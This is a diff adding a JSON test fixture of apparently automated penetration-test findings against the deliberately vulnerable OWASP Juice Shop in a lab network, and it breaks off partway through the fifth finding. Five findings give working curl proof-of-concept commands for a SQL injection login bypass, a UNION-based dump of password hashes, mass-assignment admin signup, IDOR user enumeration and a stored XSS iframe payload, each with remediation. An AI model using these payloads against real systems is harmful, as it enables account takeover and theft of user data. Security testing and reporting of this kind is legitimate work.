@@ -1,0 +1,317 @@
+{
+  "scan_order_id": "01JJCSHPTESTSCANRDER000001",
+  "completed_at": 1716114000000,
+  "duration_seconds": 2280,
+  "decepticon_events_count": 759,
+  "evidence_archive_url": "s3://tensol-test-bucket/evidence/01JJUICESHOPTESTSCANORDER01/archive.tar.gz",
+  "findings": [
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-001",
+        "severity": "critical",
+        "cvss_score": 9.3,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-89"
+        ],
+        "mitre": [
+          "T1190",
+          "T1078"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "POST /rest/user/login — SQLite-backed authentication query",
+        "confidence": "verified",
+        "objective_id": "OBJ-003",
+        "phase": "exploit",
+        "agent": "exploit",
+        "detected": null,
+        "remediation_priority": "immediate",
+        "discovered_at": "2026-05-19T08:41:30Z",
+        "title": "SQL Injection Authentication Bypass at POST /rest/user/login — Full Admin Takeover"
+      },
+      "body_md": "# [CRITICAL] SQL Injection Authentication Bypass at POST /rest/user/login — Full Admin Takeover\n\n## Description\n\nThe login endpoint `POST /rest/user/login` passes the user-supplied `email` field\ndirectly into a SQL query without sanitization or parameterization. An attacker can\ninject a boolean tautology (`' or 1=1--`) to bypass authentication entirely and\nobtain a valid admin JWT in a single unauthenticated HTTP request.\n\nThe backend query is effectively transformed from:\n\n```sql\nSELECT * FROM Users WHERE email = '<INPUT>' AND password = '<HASH>'\n```\n\nto:\n\n```sql\nSELECT * FROM Users WHERE email = '' OR 1=1--' AND password = '<HASH>'\n```\n\nThe `OR 1=1` clause always evaluates to true; `--` comments out the password check.\nSQLite returns the first row in the Users table — which is the admin account\n(`id=1`, `email=admin@juice-sh.op`, `role=admin`). The server then issues a\nfully-signed RS256 JWT for that admin account, granting unrestricted API access.\n\n## Steps to Reproduce\n\n### Step A — SQLi Authentication Bypass\n\n```bash\ncurl -sk -X POST http://juiceshop:3000/rest/user/login \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"'\"'\"' or 1=1--\",\"password\":\"anything\"}' \\\n  -o 01-login-response.json \\\n  -D 01-login-headers.txt\n```\n\n**Response (HTTP 200):**\n```json\n{\n  \"authentication\": {\n    \"token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.<payload>.<sig>\",\n    \"bid\": 1,\n    \"umail\": \"admin@juice-sh.op\"\n  }\n}\n```\n\n### Step B — Decode JWT (No Signature Verification Required)\n\n```bash\nTOKEN=$(jq -r '.authentication.token' 01-login-response.json)\nPAYLOAD=$(echo \"$TOKEN\" | cut -d'.' -f2)\necho \"${PAYLOAD}==\" | base64 -d | python3 -m json.tool\n```\n\n**Decoded JWT Payload:**\n```json\n{\n  \"status\": \"success\",\n  \"data\": {\n    \"id\": 1,\n    \"username\": \"\",\n    \"email\": \"admin@juice-sh.op\",\n    \"password\": \"0192023a7bbd73250516f069df18b500\",\n    \"role\": \"admin\",\n    \"deluxeToken\": \"\",\n    \"lastLoginIp\": \"\",\n    \"profileImage\": \"assets/public/images/uploads/defaultAdmin.png\",\n    \"totpSecret\": \"\",\n    \"isActive\": true,\n    \"createdAt\": \"2026-05-19 08:14:22.046 +00:00\",\n    \"updatedAt\": \"2026-05-19 08:14:22.046 +00:00\",\n    \"deletedAt\": null\n  },\n  \"iat\": 1779180090\n}\n```\n\n**Key observations:**\n- `data.email = \"admin@juice-sh.op\"` — admin account obtained\n- `data.role = \"admin\"` — full admin privileges\n- `data.password = \"0192023a7bbd73250516f069df18b500\"` — MD5 hash leaked in JWT\n- No `exp` claim — token **never expires**\n- MD5 hash verified: `echo -n \"admin123\" | md5sum` → `0192023a7bbd73250516f069df18b500` ✓\n\n### Step C — Privileged Action 1: Enumerate All Users\n\n```bash\ncurl -sk -X GET http://juiceshop:3000/api/Users \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -o 03-users-list.json\n```\n\n**Result:** HTTP 200 — 25 user records returned including emails, roles, and account metadata.\n\nFirst 5 records:\n| id | email | role |\n|----|-------|------|\n| 1 | admin@juice-sh.op | admin |\n| 2 | jim@juice-sh.op | customer |\n| 3 | bender@juice-sh.op | customer |\n| 4 | bjoern.kimminich@gmail.com | admin |\n| 5 | ciso@juice-sh.op | deluxe |\n\n### Step D — Privileged Action 2: Read Application Configuration\n\n```bash\ncurl -sk -X GET http://juiceshop:3000/rest/admin/application-configuration \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -o 04-app-config.json\n```\n\n**Result:** HTTP 200 — Full application configuration returned including server settings,\nchallenge configuration, CTF keys, product definitions, and internal URLs.\n\nTop-level config sections: `application`, `challenges`, `ctf`, `hackingInstructor`,\n`memories`, `products`, `server`.\n\n### Step E — Bonus: Admin Individual Record + Hash Confirmation\n\n```bash\ncurl -sk -X GET http://juiceshop:3000/api/Users/1 \\\n  -H \"Authorization: Bearer $TOKEN\" \\\n  -o 05-admin-record.json\n```\n\n**Result:** HTTP 200 — Admin account object confirmed.\nAdmin MD5 password hash from JWT: `0192023a7bbd73250516f069df18b500` = `admin123`\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Authentication | Complete bypass — no credentials required |\n| Account Takeover | Full admin account (id=1) obtained in one request |\n| Data Exposure | All 25 user accounts enumerated (emails, roles, metadata) |\n| Credential Leak | Admin MD5 password hash leaked in JWT payload; trivially cracked |\n| Privilege Escalation | Unauthenticated → admin in one HTTP request |\n| Persistence | JWT has no expiry (`exp` claim absent) — access is indefinite |\n| Config Exposure | Full application configuration readable including CTF keys |\n\n## Evidence\n\n| # | Type | Path | Description |\n|---|------|------|-------------|\n| 1 | http-response | findings/evidence/FIND-001_login-response.json | Raw login response with admin JWT |\n| 2 | http-headers | findings/evidence/FIND-001_login-headers.txt | HTTP 200 response headers |\n| 3 | terminal-log | findings/evidence/FIND-001_jwt-decoded.txt | Decoded JWT header + payload |\n| 4 | http-response | findings/evidence/FIND-001_users-list.json | Full 25-user enumeration |\n| 5 | http-response | findings/evidence/FIND-001_app-config.json | Application configuration dump |\n| 6 | http-response | findings/evidence/FIND-001_admin-record.json | Admin user record (id=1) |\n| 7 | poc-script | exploit/poc.sh | Self-contained reproducible PoC (Steps A→E) |\n| 8 | poc-writeup | exploit/poc.md | Narrative writeup with annotated requests/responses |\n\n## Detection\n\n- **Detected by Blue Team**: No\n- **Notes**: Single HTTP POST request with no authentication. No rate limiting, no\n  WAF, no anomaly detection observed. The SQLi payload `' or 1=1--` would appear\n  in application logs but only if request body logging is enabled (not default).\n\n## Remediation\n\n1. **Parameterized queries / ORM**: Replace raw SQL string concatenation with\n   prepared statements or ORM query builders. The email field must never be\n   interpolated directly into SQL.\n2. **Input validation**: Reject email values containing SQL metacharacters\n   (`'`, `--`, `;`, `/*`) at the application layer.\n3. **Password hashing**: Replace MD5 with bcrypt/Argon2. MD5 is not a password\n   hash — it is trivially crackable.\n4. **JWT hardening**: Add `exp` claim to all issued tokens (e.g., 1-hour TTL).\n   Do not embed password hashes in JWT payloads.\n5. **Least privilege**: The `/api/Users` endpoint should not return all users to\n   any authenticated user — scope it to admin role only, and strip sensitive fields.\n\n## References\n\n- CWE-89: https://cwe.mitre.org/data/definitions/89.html\n- OWASP A03:2021 Injection: https://owasp.org/Top10/A03_2021-Injection/\n- MITRE T1190: https://attack.mitre.org/techniques/T1190/\n- MITRE T1078: https://attack.mitre.org/techniques/T1078/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-002",
+        "severity": "critical",
+        "cvss_score": 9.3,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-89"
+        ],
+        "mitre": [
+          "T1190",
+          "T1213"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "GET /rest/products/search — UNION-based SQL injection in search query parameter",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "immediate",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "SQL Injection — UNION-Based Database Read via Product Search",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-002",
+        "evidence_files": [
+          "recon/detect/VULN-SQLi-union-search.md"
+        ],
+        "poc": "curl -s \"http://juiceshop:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20'1','2','3','4','5','6','7','8','9'--\"\n"
+      },
+      "body_md": "# [CRITICAL] SQL Injection — UNION-Based Database Read via Product Search\n\n## Description\n\nThe `q` parameter of `GET /rest/products/search` is interpolated directly into a\nSQLite query without parameterization or sanitization. An unauthenticated attacker\ncan inject a UNION SELECT clause to read arbitrary data from any table in the\ndatabase.\n\nThe backend query is effectively:\n\n```sql\nSELECT * FROM Products WHERE name LIKE '%<INPUT>%' OR description LIKE '%<INPUT>%'\n```\n\nThe payload `qwert'))` closes the existing string literal and parentheses, then\n`UNION SELECT '1','2','3','4','5','6','7','8','9'--` appends a second SELECT\nreturning attacker-controlled values across all 9 columns. Because all 9 columns\nare reflected in the JSON response, an attacker can replace the literal strings\nwith subqueries against any table — including `Users` (emails, MD5 password hashes),\n`Orders`, `sqlite_master` (schema enumeration), etc.\n\nThis vulnerability is distinct from FIND-001 (auth bypass): it is unauthenticated,\nrequires no prior knowledge, and provides **read access to the entire database**.\n\n## Reproduction\n\n### Step 1 — Confirm UNION injection and column count\n\n```bash\ncurl -s \"http://juiceshop:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20'1','2','3','4','5','6','7','8','9'--\"\n```\n\n**Response (HTTP 200):**\n\n```json\n{\n    \"status\": \"success\",\n    \"data\": [\n        {\n            \"id\": \"1\",\n            \"name\": \"2\",\n            \"description\": \"3\",\n            \"price\": \"4\",\n            \"deluxePrice\": \"5\",\n            \"image\": \"6\",\n            \"createdAt\": \"7\",\n            \"updatedAt\": \"8\",\n            \"deletedAt\": \"9\"\n        }\n    ]\n}\n```\n\nThe injected literal values (`\"id\":\"1\"`, `\"name\":\"2\"`, …) are returned verbatim,\nconfirming:\n- The UNION injection succeeded\n- The Products table has exactly 9 columns\n- All 9 columns are reflected in the API response\n\n### Step 2 — Escalation: dump user emails and password hashes\n\n```bash\n# Enumerate email addresses from the Users table\ncurl -s \"http://juiceshop:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20(SELECT%20email%20FROM%20Users%20LIMIT%201%20OFFSET%200),'2','3','4','5','6','7','8','9'--\"\n\n# Enumerate password hashes\ncurl -s \"http://juiceshop:3000/rest/products/search?q=qwert'))%20UNION%20SELECT%20(SELECT%20password%20FROM%20Users%20LIMIT%201%20OFFSET%200),'2','3','4','5','6','7','8','9'--\"\n```\n\nIterating `OFFSET` values 0–N dumps the complete user table. Combined with FIND-007\n(MD5 hashing), all password hashes are trivially crackable offline.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Confidentiality | Full database read — all tables accessible without authentication |\n| User Data | All user emails, MD5 password hashes, roles, and metadata extractable |\n| Schema Disclosure | `sqlite_master` readable — full schema enumeration |\n| Credential Theft | MD5 hashes crackable offline in seconds (see FIND-007) |\n| Chaining | Combines with FIND-007 (weak crypto) for complete credential compromise |\n| Authentication | Extracted hashes enable offline password cracking → account takeover |\n\n## Evidence Files\n\n- [`recon/detect/VULN-SQLi-union-search.md`](/workspace/recon/detect/VULN-SQLi-union-search.md) — Source detection file with captured request/response\n\n## Remediation\n\n1. **Parameterized queries**: Replace all raw SQL string interpolation with prepared\n   statements or ORM query builders (Sequelize `where` clauses with bound parameters).\n2. **Input validation**: Reject or escape SQL metacharacters (`'`, `)`, `--`, `UNION`,\n   `SELECT`) in the `q` parameter at the application layer.\n3. **Least privilege**: The database user for the application should have read-only\n   access to only the tables required for product search — not `Users` or `Orders`.\n4. **WAF rule**: Deploy a WAF rule blocking UNION/SELECT patterns in query parameters\n   as a defence-in-depth measure (not a primary fix).\n\n## References\n\n- CWE-89: https://cwe.mitre.org/data/definitions/89.html\n- OWASP A03:2021 Injection: https://owasp.org/Top10/A03_2021-Injection/\n- MITRE T1190 (Exploit Public-Facing Application): https://attack.mitre.org/techniques/T1190/\n- MITRE T1213 (Data from Information Repositories): https://attack.mitre.org/techniques/T1213/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-003",
+        "severity": "critical",
+        "cvss_score": 9.3,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-915"
+        ],
+        "mitre": [
+          "T1190",
+          "T1078.001"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "POST /api/Users — mass assignment allows unauthenticated role elevation to admin",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "immediate",
+        "discovered_at": "2026-05-19T08:28:02Z",
+        "title": "Mass Assignment — Unauthenticated Self-Promotion to Admin via POST /api/Users",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-003",
+        "evidence_files": [
+          "recon/detect/VULN-MassAssignment-role-escalation.md"
+        ],
+        "poc": "curl -s -X POST http://juiceshop:3000/api/Users \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"massassign_test@evil.com\",\n    \"password\": \"Test1234!\",\n    \"passwordRepeat\": \"Test1234!\",\n    \"securityQuestion\": {\"id\":1,\"question\":\"Your eldest siblings middle name?\",\"createdAt\":\"2022-01-01\",\"updatedAt\":\"2022-01-01\"},\n    \"securityAnswer\": \"test\",\n    \"role\": \"admin\",\n    \"isAdmin\": true\n  }'\n"
+      },
+      "body_md": "# [CRITICAL] Mass Assignment — Unauthenticated Self-Promotion to Admin via POST /api/Users\n\n## Description\n\nThe user registration endpoint `POST /api/Users` passes the entire request body\ndirectly to the Sequelize ORM without filtering sensitive fields. The `role` field —\nwhich should only be settable by an existing administrator — is accepted from\nunauthenticated user input and persisted to the database verbatim.\n\nAn anonymous attacker can include `\"role\": \"admin\"` and `\"isAdmin\": true` in the\nregistration payload. The server responds with HTTP 201 and confirms the admin role\nin the response body. Subsequent login returns a fully-signed admin JWT, granting\nunrestricted access to all administrative functions.\n\nThis is an alternative path to full admin compromise that requires no SQL knowledge\nand no prior authentication — it is a single HTTP POST request.\n\n## Reproduction\n\n### Step 1 — Register a new user with admin role (no authentication required)\n\n```bash\ncurl -s -X POST http://juiceshop:3000/api/Users \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"massassign_test@evil.com\",\n    \"password\": \"Test1234!\",\n    \"passwordRepeat\": \"Test1234!\",\n    \"securityQuestion\": {\"id\":1,\"question\":\"Your eldest siblings middle name?\",\"createdAt\":\"2022-01-01\",\"updatedAt\":\"2022-01-01\"},\n    \"securityAnswer\": \"test\",\n    \"role\": \"admin\",\n    \"isAdmin\": true\n  }'\n```\n\n**Response (HTTP 201 Created):**\n\n```json\n{\n    \"status\": \"success\",\n    \"data\": {\n        \"username\": \"\",\n        \"deluxeToken\": \"\",\n        \"lastLoginIp\": \"0.0.0.0\",\n        \"profileImage\": \"/assets/public/images/uploads/defaultAdmin.png\",\n        \"isActive\": true,\n        \"id\": 24,\n        \"email\": \"massassign_test@evil.com\",\n        \"role\": \"admin\",\n        \"updatedAt\": \"2026-05-19T08:28:02.678Z\",\n        \"createdAt\": \"2026-05-19T08:28:02.678Z\",\n        \"deletedAt\": null\n    }\n}\n```\n\nKey indicators of successful exploitation:\n- `\"role\": \"admin\"` — attacker-supplied role accepted and persisted\n- `\"profileImage\": \".../defaultAdmin.png\"` — admin profile image assigned, confirming role\n\n### Step 2 — Login to confirm admin JWT is issued\n\n```bash\ncurl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"massassign_test@evil.com\",\"password\":\"Test1234!\"}'\n```\n\nResponse contains `\"role\": \"admin\"` in the decoded JWT payload, confirming full\nadministrative access.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Authentication | Complete bypass — no credentials or prior access required |\n| Privilege Escalation | Anonymous → admin in a single HTTP request |\n| Account Creation | Attacker controls a persistent admin account with known credentials |\n| Persistence | Admin account survives application restarts; credentials are attacker-chosen |\n| Equivalent Impact | Identical post-exploitation capability to FIND-001 (SQLi auth bypass) |\n| Chaining | Admin JWT enables IDOR (FIND-004), config disclosure (FIND-008), and all admin APIs |\n\n## Evidence Files\n\n- [`recon/detect/VULN-MassAssignment-role-escalation.md`](/workspace/recon/detect/VULN-MassAssignment-role-escalation.md) — Source detection file with captured request/response and login verification\n\n## Remediation\n\n1. **Field allowlist**: In the user registration handler, explicitly allowlist only\n   permitted fields (`email`, `password`, `passwordRepeat`, `securityQuestion`,\n   `securityAnswer`). Never pass raw request body objects to ORM `create()` calls.\n2. **Remove sensitive fields from ORM mass-assignment**: Configure Sequelize model\n   to mark `role` and `isAdmin` as non-mass-assignable (use `_allowedAttributes` or\n   equivalent guard).\n3. **Role assignment logic**: Role should only be set server-side (default: `customer`)\n   and only modifiable by an authenticated admin via a separate privileged endpoint.\n4. **Input validation**: Reject any registration payload containing `role`, `isAdmin`,\n   or other privilege-related fields with HTTP 400.\n\n## References\n\n- CWE-915: https://cwe.mitre.org/data/definitions/915.html\n- OWASP A08:2021 Software and Data Integrity Failures: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\n- OWASP A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n- MITRE T1190 (Exploit Public-Facing Application): https://attack.mitre.org/techniques/T1190/\n- MITRE T1078.001 (Valid Accounts: Default Accounts): https://attack.mitre.org/techniques/T1078/001/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-004",
+        "severity": "high",
+        "cvss_score": 7.1,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-639",
+          "CWE-285"
+        ],
+        "mitre": [
+          "T1087.001",
+          "T1069"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "GET /api/Users — broken access control allows any authenticated user to enumerate all accounts",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "high",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "Broken Access Control / IDOR — Full User Enumeration by Any Authenticated User",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-004",
+        "evidence_files": [
+          "recon/detect/VULN-IDOR-user-enumeration.md",
+          "findings/evidence/FIND-001_users-list.json"
+        ],
+        "poc": "# Step 1: Obtain any valid JWT (customer role sufficient)\nUSER_TOKEN=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\n# Step 2: Enumerate ALL users (no admin role required)\ncurl -s http://juiceshop:3000/api/Users \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n\n# Step 3: Read any individual user record by ID (IDOR)\ncurl -s http://juiceshop:3000/api/Users/1 \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n"
+      },
+      "body_md": "# [HIGH] Broken Access Control / IDOR — Full User Enumeration by Any Authenticated User\n\n## Description\n\nThe `GET /api/Users` endpoint returns the complete list of all registered users —\nincluding admin accounts, email addresses, roles, last login IPs, and profile\nmetadata — to any authenticated user regardless of role. No admin privilege check\nis enforced.\n\nAdditionally, `GET /api/Users/{id}` allows any authenticated user to read any\nindividual user record by supplying an arbitrary integer ID (Insecure Direct Object\nReference). There is no ownership check — a customer-role user can read the admin's\nfull record.\n\nThis constitutes both horizontal privilege escalation (reading other users' data)\nand a missing authorization control on an admin-scoped endpoint.\n\n## Reproduction\n\n### Step 1 — Obtain a customer-role JWT\n\n```bash\nUSER_TOKEN=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n```\n\n### Step 2 — Enumerate ALL users with customer token\n\n```bash\ncurl -s http://juiceshop:3000/api/Users \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n```\n\n**Response (HTTP 200 — excerpt, 25 users returned):**\n\n```json\n{\n    \"status\": \"success\",\n    \"data\": [\n        {\n            \"id\": 1,\n            \"username\": \"\",\n            \"email\": \"admin@juice-sh.op\",\n            \"role\": \"admin\",\n            \"deluxeToken\": \"\",\n            \"lastLoginIp\": \"\",\n            \"profileImage\": \"assets/public/images/uploads/defaultAdmin.png\",\n            \"isActive\": true,\n            \"createdAt\": \"2026-05-19T08:14:22.046Z\",\n            \"updatedAt\": \"2026-05-19T08:14:22.046Z\",\n            \"deletedAt\": null\n        },\n        {\n            \"id\": 2,\n            \"username\": \"\",\n            \"email\": \"jim@juice-sh.op\",\n            \"role\": \"customer\"\n        },\n        {\n            \"id\": 3,\n            \"username\": \"\",\n            \"email\": \"bender@juice-sh.op\",\n            \"role\": \"customer\"\n        },\n        {\n            \"id\": 4,\n            \"username\": \"bkimminich\",\n            \"email\": \"bjoern.kimminich@gmail.com\",\n            \"role\": \"admin\"\n        }\n    ]\n}\n```\n\n### Step 3 — IDOR: read admin record directly by ID\n\n```bash\ncurl -s http://juiceshop:3000/api/Users/1 \\\n  -H \"Authorization: Bearer $USER_TOKEN\"\n```\n\nReturns the full admin user object. Any integer ID 1–N is accessible.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| User Enumeration | All 25 registered accounts exposed: emails, roles, lastLoginIp, timestamps |\n| Admin Discovery | Admin email addresses (`admin@juice-sh.op`, `bjoern.kimminich@gmail.com`) revealed |\n| Targeted Phishing | Full email list enables targeted spear-phishing campaigns |\n| IDOR | Any user record readable by ID — no ownership enforcement |\n| Chaining | User list + MD5 hashes (FIND-007) + SQLi UNION (FIND-002) = full credential dump |\n| Privacy | PII (email, IP, profile data) exposed to all authenticated users |\n\n## Evidence Files\n\n- [`recon/detect/VULN-IDOR-user-enumeration.md`](/workspace/recon/detect/VULN-IDOR-user-enumeration.md) — Source detection file with captured response\n- [`findings/evidence/FIND-001_users-list.json`](/workspace/findings/evidence/FIND-001_users-list.json) — Full 25-user enumeration captured during FIND-001 exploitation\n\n## Remediation\n\n1. **Role-based access control**: Restrict `GET /api/Users` to admin role only.\n   Return HTTP 403 for any non-admin JWT.\n2. **IDOR fix**: `GET /api/Users/{id}` should only return the record matching the\n   authenticated user's own ID. Admin users may access all records.\n3. **Field filtering**: Strip sensitive fields (`lastLoginIp`, `totpSecret`,\n   `deluxeToken`) from API responses for non-admin callers.\n4. **Pagination + rate limiting**: Even for admin users, paginate the user list and\n   apply rate limiting to prevent bulk enumeration.\n\n## References\n\n- CWE-639: https://cwe.mitre.org/data/definitions/639.html\n- CWE-285: https://cwe.mitre.org/data/definitions/285.html\n- OWASP A01:2021 Broken Access Control: https://owasp.org/Top10/A01_2021-Broken_Access_Control/\n- MITRE T1087.001 (Account Discovery: Local Account): https://attack.mitre.org/techniques/T1087/001/\n- MITRE T1069 (Permission Groups Discovery): https://attack.mitre.org/techniques/T1069/\n",
+      "evidence_keys": []
+    },
+    {
+      "raw_yaml_frontmatter": {
+        "id": "FIND-005",
+        "severity": "high",
+        "cvss_score": 7.5,
+        "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:L/VA:N/SC:H/SI:H/SA:N",
+        "cvss_version": "4.0",
+        "cwe": [
+          "CWE-79"
+        ],
+        "mitre": [
+          "T1059.007",
+          "T1185"
+        ],
+        "affected_target": "juiceshop (172.22.0.5:3000)",
+        "affected_component": "PUT /rest/products/{id}/reviews — stored XSS via unsanitized HTML in review message field",
+        "confidence": "verified",
+        "objective_id": "OBJ-002",
+        "phase": "detect",
+        "agent": "postexploit",
+        "detected": null,
+        "remediation_priority": "high",
+        "discovered_at": "2026-05-19T08:30:00Z",
+        "title": "Stored XSS — Persistent JavaScript Injection via Product Reviews",
+        "target": "http://juiceshop:3000/",
+        "vuln_id": "FIND-005",
+        "evidence_files": [
+          "recon/detect/VULN-XSS-stored-review.md"
+        ],
+        "poc": "# Step 1: Obtain any valid JWT (customer role sufficient)\nUSER_TOKEN=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n\n# Step 2: Store XSS payload in product review\ncurl -s -X PUT \"http://juiceshop:3000/rest/products/1/reviews\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -d '{\"message\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\",\"author\":\"test\"}'\n\n# Step 3: Retrieve reviews — payload returned unescaped (executes in browser)\ncurl -s http://juiceshop:3000/rest/products/1/reviews\n"
+      },
+      "body_md": "# [HIGH] Stored XSS — Persistent JavaScript Injection via Product Reviews\n\n## Description\n\nThe `message` field in product reviews (`PUT /rest/products/{id}/reviews`) accepts\narbitrary HTML and JavaScript without sanitization or encoding. The payload is stored\nin the database verbatim and returned unescaped in subsequent `GET` requests. When\nthe Angular frontend renders this data using an unsafe binding (e.g., `innerHTML`),\nthe injected script executes in every victim's browser that views the product page.\n\nThis is a **stored (persistent) XSS** — the payload persists across sessions and\nexecutes automatically for all users who view the affected product, including\nadministrators. No user interaction beyond viewing the product page is required.\n\n## Reproduction\n\n### Step 1 — Obtain a valid JWT (any role)\n\n```bash\nUSER_TOKEN=$(curl -s -X POST http://juiceshop:3000/rest/user/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"testuser@example.com\",\"password\":\"TestPassword123!\"}' \\\n  | python3 -c \"import sys,json; print(json.load(sys.stdin)['authentication']['token'])\")\n```\n\n### Step 2 — Inject XSS payload into product review\n\n```bash\ncurl -s -X PUT \"http://juiceshop:3000/rest/products/1/reviews\" \\\n  -H \"Content-Type: application/json\" \\\n  -H \"Authorization: Bearer $USER_TOKEN\" \\\n  -d '{\"message\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\",\"author\":\"test\"}'\n```\n\n**Response (HTTP 200):** Payload accepted and stored.\n\n### Step 3 — Retrieve reviews — payload returned unescaped\n\n```bash\ncurl -s http://juiceshop:3000/rest/products/1/reviews\n```\n\n**Response (HTTP 200 — excerpt):**\n\n```json\n{\n    \"status\": \"success\",\n    \"data\": [\n        {\n            \"message\": \"One of my favorites!\",\n            \"author\": \"admin@juice-sh.op\",\n            \"product\": 1,\n            \"likesCount\": 0,\n            \"likedBy\": [],\n            \"_id\": \"7wtcApEaLSd2Mwx3B\"\n        },\n        {\n            \"product\": \"1\",\n            \"message\": \"<iframe src=\\\"javascript:alert(`xss`)\\\">\",\n            \"author\": \"test\",\n            \"likesCount\": 0,\n            \"likedBy\": [],\n            \"_id\": \"YBNpbKKg2dEMaGZDs\"\n        }\n    ]\n}\n```\n\nThe `<iframe src=\"javascript:alert(`xss`)\">` payload is stored and returned\nunescaped. When rendered by the Angular frontend via unsafe HTML binding, the\n`javascript:` URI executes in the victim's browser context.\n\n## Impact\n\n| Impact Category | Detail |\n|----------------|--------|\n| Session Hijacking | XSS payload can exfiltrate `localStorage` JWT tokens via `document.cookie` / storage APIs |\n| Credential Theft | Fake login overlay injected into product page harvests credentials |\n| Persistent Execution | Payload executes for every user viewing the product — including admins |\n| Privilege Escalation | Admin session token stolen → full admin access without authentication |\n| Chaining | Combined with CORS `*` (FIND-009): stolen tokens exfiltrated cross-origin to attacker server |\n| Keylogging | JavaScript keylogger injected into all product pages |\n\n## Evidence Files\n\n- [`recon/detect/VULN-XSS-stored-review.md`](/workspace/recon/detect/VULN-XSS-stored-review.md) — Source detection file with captured injection request and stored payload retrieval\n\n## Remediation\n\n1. **Output encoding**: HTML-encode all user-supplied content before rendering in\n   the DOM. Use Angular's built-in sanitization (`DomSanitizer`) and avoid\n   `[innerHTML]` bindings with untrusted data.\n2. **Input sanitization**: Strip or reject HTML tags and JavaScript URIs in the\n   `message` field server-side before storage (e.g., using a sanitization library\n   such as DOMPurify or sanitize-html).\n3. **Content Security Policy**: Deploy a strict CSP header that blocks inline\n   scripts and `javascript:` URIs:\n   `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'`\n4. **Review moderation**: Implement server-side validation rejecting payloads\n   containing `<script>`, `<iframe>`, `javascript:`, and event handler attributes.\n\n## References\n\n- CWE-79: https://cwe.mitre.org/data/definitions/79.html\n- OWASP A03:2021 Injection: https://owasp.org/Top10/A03_2021-Injection/\n- OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n- MITRE T1059.007 (Command and Scripting 